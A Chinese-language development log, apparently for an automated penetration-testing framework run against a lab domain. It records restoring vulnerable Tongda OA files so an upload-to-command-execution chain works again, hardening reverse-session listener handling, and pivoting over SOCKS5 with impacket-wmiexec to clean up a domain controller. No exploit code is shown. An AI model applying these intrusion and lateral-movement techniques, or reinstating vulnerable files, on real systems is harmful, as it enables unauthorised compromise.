  ② `MYOA\webroot` 的 `inc/utility.php`（25908B）与 `ispirit/im/upload.php`（6141B）与 **OAAuto11.7 更新包**逐字同尺寸，
  而漏洞版一对（24463B／5987B）在 OAAuto11.3／11.6 包里 → 从 11.6 还原这两个文件（原件留
  `.agvbak_20260927`）并重启 `Office_Web`；随后 OA 卡端到端跑通（上传出 token → 包含 → 命令回显）。
  两处处置都已留档；「服务被停」与「webroot 被换包」哪个是充分原因未做单变量隔离（修复后状态即工作态）。
- 说明：`home=000` 期间裸 POST 上传的「用户未登录」不能作为判据（该端点的漏洞触发形状需要上传字段），
  真正的判据是卡片跑通与免登端点回执。

**回归**：整图 **14/14**（`output/runs/E-adopt-recheck-1`，`status=succeeded`，granted＝web1/pc1/web2_docker/web2/dc/pc2）；
`pytest` **1336 passed / 1 skipped**；`scripts/ci.py` **4/4 PASS**。
在册 **35 条 = 31 implemented + 4 program_only**（`skills/index.json` `status_counts`）。

**未决（如实）**：① 控制台会话执行系统命令的读回超时（`session-exec`）仍在；② `ensure_deep_endpoint` 的深层执行点未接线；
③ DC 遗留 OU/GPO 不可安全撤销（通道条件）。

## 批次7 · 第 181 轮（2026-09-27 凌晨）：桥 r179 复核落地 —— 关联证据 / 就绪屏障 / 目标侧摘要 / 收尾

**背景**：桥 r179（ultra，242 s）对第 180 轮的纳管三卡给出「架构放行、按'可实机可复现无尾巴'标准暂不放行」，
列出最小补项。本轮逐条落地，并在真机上抓到它预言的坑。

**补项与落码**：
- **接收器就绪屏障**：控制台把接收器作业起成独立进程，调用方返回后才轮到它监听；搬字节落进这个缝里
  （一次性端点）就永久报废。现在先等接收器在**自己的日志**里自报家门（`job=<n> uuid=<v>`），
  没等到就**零搬运**返回（`attribution=receiver_not_ready`）。
- **关联取值**：除了接收器日志的认领行，新增控制台侧 `session-info --sid`（打印该会话记录 + 所属控制台实例），
  把控制台自己的 `exploit_uuid` 与本次调用铸的接收器 uuid 对上；不一致就记 `observed_new_sid` 并附
  `attribution_note` 说明控制台把它记在哪个运行名下。实测发现：**控制台会把同一族的会话一直记在最早那个
  接收器作业名下**（sid 17/19/20 都指向首个接收器 `xph84vku`）——这正是"旧包复活被误认领"的成因。
- **接收器退休**：登记完成即 `job-stop` 掉本次接收器（`keep_receiver` 可显式保留）。清掉历史遗留的 10 个
  接收器作业后复跑，归属从 `observed_new_sid` 变回 **`receiver_log`，且 `receiver_uuid == console_uuid`**。
- **每次调用唯一落地路径** + **打包失败拒绝启动**：固定名会被上一次仍在运行的端点占住，
  写入报 `Text file busy`，随后启动的其实是旧文件（`output/runs/H-adopt-native-clean`，stage2 rc=2）。
  改 `<name>_<本次短号>` 后复跑（`H-adopt-native-clean2`）打包三步全 rc=0、归领诚实、接收器自动退休。
- **挂载两侧摘要核对**：`stage_path ≠ launch_path` 时，启动前由启动侧读回该文件 sha256 与本次生成字节比对，
  不一致**拒绝启动**（`digest_mismatch`）。防"路径同名、实为另一台机器"。
- 控制台客户端新增 `session-info` / `job-list` / `job-stop` 三个子命令（离线用例 +3；
  并修掉一个真缺陷：会话表若以整数为键，`session-info` 会误报 not found）。

**测试与回归**：`pytest` **1347 passed / 1 skipped**；`scripts/ci.py` **4/4 PASS**。

**未决（同 180 轮，未变）**：控制台会话执行系统命令的读回超时；`ensure_deep_endpoint` 的深层执行点未接线；
DC 遗留 OU/GPO 不可安全撤销。

## 批次7 · 第 183 轮（2026-09-27 凌晨）：① 收口翻案 —— DC 遗留 OU/GPO 真删除（经中继 + 带读回的通道）

**翻案依据**：第 163 轮判「不可安全撤销」，针对的是 `PC1 → DC` 几条通道（LDAP referral / C$ 拒绝 / SYSVOL 拒绝 /
WMI 能跑但取不回输出）。中继打通后，**控制端 → 中间机（SOCKS5）→ DC** 这条路不需要 PC1 的转发即可用
`impacket-wmiexec`（输出经 ADMIN$ 回读）；PowerShell 走 `-EncodedCommand`（UTF-16LE base64）绕开引号层，
一次一个 argv 元素，读回干净。

**只读清点（先看再动）**：
- OU：`OU=AGV-Recovery,DC=whoamianony,DC=org`，其下只有 `CN=PC1`——**域内唯一的 PC1 计算机账号**（2026-09-16 建，即入域那次），
  也就是说这个 OU 不是"空壳实验"，PC1 的账号被**移**了进去；
- GPO：`AGV-FWOff`（`{CE96A2AF-7862-4E0C-8C93-8132DE11D024}`，创建于 2026-09-25 21:51），经 `gPLink` 链到该 OU。

**安全顺序（关键）**：
1. `Move-ADObject` 把 `CN=PC1` 搬回 `CN=Computers,DC=whoamianony,DC=org`（与 PC2 同处；**直接递归删 OU 会连带删掉域账号**）；
2. `Remove-GPO -Name AGV-FWOff -Confirm:$false`（策略与其 SYSVOL 一并移除，链接随 OU 消失）；
3. `Set-ADOrganizationalUnit -ProtectedFromAccidentalDeletion $false` → `Remove-ADOrganizationalUnit -Confirm:$false`。

**事后清点（读回原文）**：`OU` 仅剩 `OU=Domain Controllers`；`GPO` 仅剩两条默认策略；计算机对象
`DC`（Domain Controllers）/`PC1`、`PC2`（Computers）。PC1 的 8080/445/135 均 open；整图 **14/14**
（`output/runs/I-post-dc-cleanup`，granted 六台全在）。

**通道复用说明**：本条路径 100% 复用既有能力（`clients/agv_socks5.py` 的访问方向 + `impacket-wmiexec` 卡同一客户端），
没有为一次性用途新增平台代码；只在中继上多跑了一个只读清点脚本与一个删除脚本。
